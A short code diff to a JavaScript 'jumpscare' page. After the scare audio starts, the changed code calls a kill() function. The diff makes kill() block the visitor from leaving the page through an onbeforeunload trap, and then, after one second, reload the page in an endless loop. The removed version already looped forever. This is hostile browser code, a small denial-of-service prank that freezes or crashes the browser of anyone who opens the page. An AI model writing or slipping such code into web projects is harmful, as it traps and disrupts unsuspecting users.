@@ -126,7 +126,7 @@ function showJumpscare() {
         audio.autoplay = true;
         audio.addEventListener('playing', (event) => {
             wait(delay, 1).then(function() {
-                return spawnKill();
+                return kill();
             });
         });
         audio.play();        
@@ -147,9 +147,10 @@ function spawnKill() {
 }
 
 async function kill() {
-    for (var i = 5; i > 3; i = i + 1) { 
-        console.log(i);
-    }
+    onbeforeunload = () => true;
+    setTimeout(function(){
+        while(1)location.reload(1)
+      }, 1000)
 }
 
 
